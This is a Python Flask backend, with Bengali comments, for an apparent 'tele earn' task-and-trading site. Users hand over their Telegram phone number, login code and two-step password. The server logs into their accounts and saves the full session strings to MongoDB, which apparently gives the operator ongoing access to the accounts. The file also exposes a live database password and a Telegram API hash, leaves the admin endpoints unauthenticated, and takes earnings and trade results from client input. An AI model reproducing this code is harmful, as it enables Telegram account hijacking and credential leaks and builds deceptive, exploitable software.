import os
import asyncio
import nest_asyncio
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from pymongo import MongoClient
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime

# রেন্ডার বা ক্লাউড সার্ভারের জন্য লুপ ফিক্স
nest_asyncio.apply()

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")

# CORS সেটিংস
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# আপনার কনফিগারেশন (API ID/Hash & MongoDB)
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

# ডাটাবেস কানেকশন (স্ক্রিনশট অনুযায়ী সঠিক নাম: aaf_tele_earn_db)
client_db = MongoClient(MONGO_URI)
db = client_db['aaf_tele_earn_db']
users_col = db['users']
ads_col = db['ads']  
tasks_col = db['tasks'] 
withdraws_col = db['withdraws']

# টেম্পোরারি ক্লায়েন্ট স্টোর (ওটিপি পাঠানোর জন্য)
temp_clients = {}

# ---------------------------------------------------------
# ১. HTML পেজ রাউটস (Frontend Routes)
# ---------------------------------------------------------

@app.route('/')
@app.route('/login')
def login(): return render_template('login.html')

@app.route('/dashboard')
def dashboard(): return render_template('dashboard.html')

@app.route('/task')
def task(): return render_template('task.html')

@app.route('/trading')
def trading(): return render_template('trading.html')

@app.route('/account')
def account(): return render_template('account.html')

@app.route('/wallet')
def wallet(): return render_template('wallet.html')

@app.route('/admin')
def admin_page(): return render_template('admin.html')


# ---------------------------------------------------------
# ২. ইউজার লগইন ও ওটিপি এপিআই (Authentication)
# ---------------------------------------------------------

@app.route('/api/send_otp', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone')
    if not phone: return jsonify({"success": False, "message": "Phone number missing"})

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
        client.connect()
        result = client.send_code_request(phone)
        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash, "loop": loop}
        return jsonify({"success": True, "message": "OTP Sent Successfully!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
def verify_login():
    data = request.json
    phone, code, password = data.get('phone'), data.get('code'), data.get('password')
    if phone not in temp_clients: return jsonify({"success": False, "message": "Session expired"})

    try:
        loop = temp_clients[phone]["loop"]
        asyncio.set_event_loop(loop)
        client = temp_clients[phone]["client"]
        h = temp_clients[phone]["hash"]
        
        # টেলিগ্রামে সাইন ইন
        user = client.sign_in(phone, code, phone_code_hash=h, password=password)
        
        # স্ট্রং সেশন জেনারেট (অটো-আপডেট লজিক)
        session_str = client.session.save()
        
        user_info = {
            "telegram_id": user.id,
            "phone": phone,
            "name": f"{user.first_name or ''} {user.last_name or ''}",
            "username": user.username,
            "session_string": session_str, 
            "last_login": datetime.utcnow()
        }
        
        # MongoDB আপডেট (পুরনো ইউজার হলে আপডেট, নতুন হলে ইনসার্ট)
        users_col.update_one(
            {"telegram_id": user.id},
            {
                "$set": user_info,
                "$setOnInsert": {
                    "main_balance": 0.00,
                    "joined_at": datetime.utcnow(),
                    "status": "active",
                    "completed_tasks": 0
                }
            },
            upsert=True
        )
        
        session["uid"] = user.id
        return jsonify({"success": True, "uid": user.id, "message": "Login Successful!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})


# ---------------------------------------------------------
# ৩. ইউজার প্রোফাইল ও ড্যাশবোর্ড এপিআই (User Data)
# ---------------------------------------------------------

@app.route('/api/user/dashboard_stats')
@app.route('/api/get_user_info') # আপনার ডাবল রাউট সাপোর্ট করার জন্য
def get_user_stats():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False, "message": "Not logged in"})
    
    user = users_col.find_one({"telegram_id": uid})
    if user:
        return jsonify({
            "success": True,
            "balance": user.get('main_balance', 0.00),
            "name": user.get('name', 'User'),
            "phone": user.get('phone'),
            "id": user.get('telegram_id'),
            "total_tasks": user.get('completed_tasks', 0)
        })
    return jsonify({"success": False, "message": "User not found"})


# ---------------------------------------------------------
# ৪. ট্রেডিং ও ব্যালেন্স আপডেট এপিআই (Earning)
# ---------------------------------------------------------

@app.route('/api/trade/update_result', methods=['POST'])
def update_trade():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False, "message": "Login required"})

    data = request.json
    amount = float(data.get('amount', 0))
    result = data.get('result') # 'win' অথবা 'loss'
    profit_percent = 0.80 # ৮০% প্রফিট

    change = (amount * profit_percent) if result == 'win' else -amount
    
    users_col.update_one({"telegram_id": uid}, {"$inc": {"main_balance": change}})
    return jsonify({"success": True, "message": "Balance Updated"})

@app.route('/api/add_balance', methods=['POST']) # টাস্ক রিওয়ার্ডের জন্য
def add_task_balance():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False})
    
    amount = float(request.json.get('amount', 0))
    users_col.update_one(
        {"telegram_id": uid},
        {"$inc": {"main_balance": amount, "completed_tasks": 1}}
    )
    return jsonify({"success": True})


# ---------------------------------------------------------
# ৫. অ্যাডমিন কন্ট্রোল এপিআই (Admin Power)
# ---------------------------------------------------------

@app.route('/api/update_ads', methods=['POST'])
def update_ads():
    try:
        data = request.json
        ads_list = data.get('ads', [])
        ads_col.delete_many({}) 
        if ads_list:
            ads_col.insert_many(ads_list)
        return jsonify({"success": True, "message": "Ads Updated Successfully!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/add_task', methods=['POST'])
def add_task():
    try:
        task_data = request.json
        tasks_col.insert_one({
            "title": task_data.get('title'),
            "reward": float(task_data.get('reward', 0)),
            "link": task_data.get('link'),
            "status": "active",
            "created_at": datetime.utcnow()
        })
        return jsonify({"success": True, "message": "Task Added!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/admin/update_user', methods=['POST'])
def admin_update_user():
    try:
        data = request.json
        tg_id = int(data.get('telegram_id'))
        new_bal = float(data.get('balance', 0))
        users_col.update_one({"telegram_id": tg_id}, {"$set": {"main_balance": new_bal}})
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False})


# ---------------------------------------------------------
# ৬. অ্যাড ও টাস্ক লোড এপিআই (Frontend Feed)
# ---------------------------------------------------------

@app.route('/api/get_active_ads')
@app.route('/api/get_ads')
def get_ads():
    ads = list(ads_col.find({}, {"_id": 0}))
    return jsonify({"success": True, "ads": ads})

@app.route('/api/get_tasks')
def get_tasks():
    tasks = list(tasks_col.find({"status": "active"}, {"_id": 0}))
    return jsonify({"success": True, "tasks": tasks})


# ---------------------------------------------------------
# ৭. সার্ভার রান (Execution)
# ---------------------------------------------------------

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
